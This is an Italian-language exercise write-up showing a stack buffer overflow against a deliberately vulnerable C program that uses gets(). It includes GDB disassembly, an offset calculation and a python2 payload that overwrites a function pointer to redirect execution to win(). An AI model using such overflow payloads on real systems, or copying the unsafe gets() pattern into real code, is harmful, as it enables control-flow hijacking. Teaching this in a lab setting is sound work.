# Esercizio 3 – Overflow per esecuzione non autorizzata

## Codice C

```c
void win() {
    printf("Hai modificato correttamente il flusso di esecuzione\n");
}

int main(int argc, char *argv[]) {
    int (*fp)();
    char buffer[X];

    fp = 0;
    gets(buffer);
    if (fp) {
        printf("Chiamo l'indirizzo della funzione, salto a 0x%08x\n", fp);
        fp();
    }
}
```

L'obiettivo è sovrascrivere il puntatore a funzione `fp` con l'indirizzo della funzione `win()`, in modo da modificare il flusso di esecuzione.

---

## Analisi con GDB

### Disassemblaggio di `main`

Eseguendo:

```gdb
(gdb) disass main
```

**Output di esempio**:

```
Dump of assembler code for function main:
   0x08048484 <+0>:  lea    0x4(%esp),%ecx
   0x08048488 <+4>:  and    $0xfffffff0,%esp
   0x0804848b <+7>:  pushl  -0x4(%ecx)
   0x0804848e <+10>: push   %ebp
   0x0804848f <+11>: mov    %esp,%ebp
-> 0x08048491 <+13>: push   %ecx
-> 0x08048492 <+14>: sub    $0x14,%esp
-> 0x08048495 <+17>: movl   $0x0,-0xc(%ebp)   ; fp = 0
   0x0804849c <+24>: sub    $0xc,%esp
-> 0x0804849f <+27>: lea    -0x16(%ebp),%eax ; buffer
   0x080484a2 <+30>: push   %eax
   0x080484a3 <+31>: call   0x8048330 <gets@plt>
   0x080484a8 <+36>: add    $0x10,%esp
-> 0x080484ab <+39>: cmpl   $0x0,-0xc(%ebp)   ; if (fp != 0)
   0x080484af <+43>: je     0x80484c9 <main+69>
   0x080484b1 <+45>: sub    $0x8,%esp
   0x080484b4 <+48>: pushl  -0xc(%ebp)
   0x080484b7 <+51>: push   $0x8048598
   0x080484bc <+56>: call   0x8048320 <printf@plt>
   0x080484c1 <+61>: add    $0x10,%esp
   0x080484c4 <+64>: mov    -0xc(%ebp),%eax
   0x080484c7 <+67>: call   *%eax             ; esegue fp()
   0x080484c9 <+69>: mov    $0x0,%eax
   0x080484ce <+74>: mov    -0x4(%ebp),%ecx
   0x080484d1 <+77>: leave
   0x080484d2 <+78>: lea    -0x4(%ecx),%esp
   0x080484d5 <+81>: ret
```

- La variabile `fp` (il puntatore a funzione) si trova a `-0xc(%ebp)`.
- Il buffer inizia a `-0x16(%ebp)`.

## Determinare l'Offset

Per capire quanti byte separano il buffer da `fp`, impostiamo un breakpoint prima della `gets()` (ad esempio, a `main+31`) e osserviamo i registri in GDB.

Esempio:

```
(gdb) i r
eax = 0xffffd5d2
ebp = 0xffffd5e8
...

indirizzo_buffer = eax          = 0xffffd5d2
indirizzo_fp     = ebp - 0xc    = 0xffffd5dc

offset = indirizzo_buffer - indirizzo_fp
       = 0xffffd5d2 - 0xffffd5dc
       = -10

⇒ Necessari 10 byte di riempimento prima di sovrascrivere fp.
```

## Indirizzo di `win()`

Tramite `disass win` o `p win`, scopriamo l'indirizzo di `win()`. 

```
(gdb) disass win
Dump of assembler code for function win:
-> 0x0804846b <+0>:     push   %ebp   ; *win()
   0x0804846c <+1>:     mov    %esp,%ebp
   0x0804846e <+3>:     sub    $0x8,%esp
   0x08048471 <+6>:     sub    $0xc,%esp
   0x08048474 <+9>:     push   $0x8048560
   0x08048479 <+14>:    call   0x8048340 <puts@plt>
   0x0804847e <+19>:    add    $0x10,%esp
   0x08048481 <+22>:    nop
   0x08048482 <+23>:    leave  
   0x08048483 <+24>:    ret    
End of assembler dump.
```

L'indirizzo è il seguente: `0x0804846b`.

In ambiente **little endian**, l'indirizzo `0x0804846b` va inserito come byte sequence `\x6b\x84\x04\x08`.

## Creazione del Payload

Costruiamo una stringa che:
1. Contiene 10 byte di padding (ad esempio `"A"*10`).
2. Subito dopo, i 4 byte dell'indirizzo di `win()` in ordine little endian.

Esempio:

```bash
python2 -c 'print("A"*10 + "\x6b\x84\x04\x08")' | ./esercizio3
```

### Output

```
Chiamo l'indirizzo della funzione, salto a 0x0804846b
Hai modificato correttamente il flusso di esecuzione
```

